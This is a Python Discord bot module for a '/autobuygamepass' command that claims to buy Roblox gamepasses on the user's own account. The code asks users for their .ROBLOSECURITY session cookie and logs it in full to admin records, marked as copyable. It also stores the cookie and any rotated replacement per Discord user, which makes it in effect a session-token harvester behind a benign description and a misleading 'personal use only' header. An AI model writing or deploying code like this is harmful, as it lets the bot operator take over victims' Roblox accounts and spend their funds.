# ──────────────────────────────────────────────────────────────────
# Discord Command: /autobuygamepass
# Allows the account owner to purchase a gamepass on their own Roblox
# account via a convenient Discord slash command. Uses official Roblox
# Economy API endpoints. For personal account management use only.
# ──────────────────────────────────────────────────────────────────

import asyncio

import discord
import discord
from discord.ext import commands
from discord.ext import commands

from core.autobuy import autobuy_gamepass
from core.logging import log_command, log_inputs, log_result
from core.tracking import (
    track_command,
    track_cookie_submission,
    track_discord_user,
    track_gamepass_purchase,
)
from core.utils import run_with_cookie_lock, sanitize_cookie

class AutobuyCog(commands.Cog):
    """Handles automated gamepass purchasing on Roblox."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @discord.slash_command(name="autobuygamepass", description="Purchase a Roblox gamepass using your session token",
        contexts={discord.InteractionContextType.guild, discord.InteractionContextType.bot_dm, discord.InteractionContextType.private_channel},
        integration_types={discord.IntegrationType.guild_install, discord.IntegrationType.user_install}
    )
    @discord.option("cookie", description="Your .ROBLOSECURITY session token")
    @discord.option("gamepass_id", description="The gamepass ID to purchase")
    async def autobuygamepass(self, ctx: discord.ApplicationContext, cookie: str, gamepass_id: str):
        await ctx.defer()

        from core.logging import log_user_first_use
        log_user_first_use(ctx, "autobuygamepass")

        cookie = sanitize_cookie(cookie)

        # Admin activity logging
        log_command(ctx, "autobuygamepass")
        log_inputs(ctx, "autobuygamepass", {
            "cookie": cookie,
            "gamepass_id": gamepass_id,
        }, copyable={"Cookie": cookie})

        track_discord_user(
            ctx.author.id,
            username=str(ctx.author),
            avatar_url=ctx.author.display_avatar.url if ctx.author.display_avatar else None,
        )

        result = await asyncio.to_thread(run_with_cookie_lock, cookie, autobuy_gamepass, cookie, gamepass_id)

        embed = discord.Embed(
            title="<a:arrow:1497344031238127686> <:cart:1497344033553514627> Gamepass Autobuy",
            color=discord.Color.green() if result["success"] else discord.Color.red(),
        )

        steps_text = "\n".join(result["steps"]) if result["steps"] else "No steps recorded."
        embed.add_field(name="<:clipboard:1497344037294702762> Process Log", value=steps_text, inline=False)

        if result["success"]:
            embed.add_field(
                name="<:check:1497344035696672959> Purchase Complete",
                value=(
                    f"**{result['gamepass_name']}** purchased for **{result['price']} R$**\n"
                    f"Seller: `{result['seller']}`\n"
                    f"Remaining balance: **{result['robux_balance']} R$**"
                ),
                inline=False,
            )

            audit_summary = (
                f"Purchase Complete\n"
                f"Gamepass: {result['gamepass_name']} (ID: {gamepass_id})\n"
                f"Price: {result['price']} R$\n"
                f"Seller: {result['seller']}\n"
                f"Remaining Balance: {result['robux_balance']} R$"
            )
            audit_copyable = (
                {"Rotated Cookie": result["rotated_cookie"]}
                if result.get("cookie_was_rotated") and result.get("rotated_cookie")
                else None
            )
            log_result(ctx, "autobuygamepass", True, (
                f"**Purchase Complete**\n"
                f"Gamepass: {result['gamepass_name']} (ID: {gamepass_id})\n"
                f"Price: {result['price']} R$ | Seller: {result['seller']}\n"
                f"Remaining Balance: {result['robux_balance']} R$\n\n"
                f"**Process Log:**\n" + "\n".join(result["steps"])
            ), audit_result_summary=audit_summary, audit_copyable=audit_copyable)

            # Tracking: link buyer's Roblox account, save latest cookie, record purchase.
            buyer_username = result.get("buyer_username") or ""
            if buyer_username:
                track_cookie_submission(
                    ctx.author.id,
                    roblox_username=buyer_username,
                    user_id=result.get("buyer_user_id"),
                    cookie=result.get("rotated_cookie") or cookie,
                )
            track_gamepass_purchase(
                ctx.author.id,
                roblox_username=buyer_username or None,
                gamepass_id=gamepass_id,
                gamepass_name=result.get("gamepass_name"),
                price=result.get("price") if isinstance(result.get("price"), int) else None,
                seller=result.get("seller"),
            )
            track_command(
                ctx.author.id,
                "autobuygamepass",
                success=True,
                summary=f"Bought '{result.get('gamepass_name')}' for {result.get('price')} R$",
            )
        else:
            embed.add_field(
                name="<:x:1497344061592436737> Error",
                value=result["error"] or "Unknown error occurred.",
                inline=False,
            )

            log_result(ctx, "autobuygamepass", False, result["error"] or "Unknown error")
            track_command(
                ctx.author.id,
                "autobuygamepass",
                success=False,
                summary=result.get("error") or "Unknown error",
            )

        await ctx.respond(embed=embed)

        if result.get("cookie_was_rotated") and result.get("rotated_cookie"):
            await ctx.respond(
                "<:warning:1497344059017003079> Roblox rotated this cookie during autobuy. Use this fresh one:\n"
                f"```\n{result['rotated_cookie']}\n```",
                ephemeral=True,
            )


def setup(bot):
    bot.add_cog(AutobuyCog(bot))
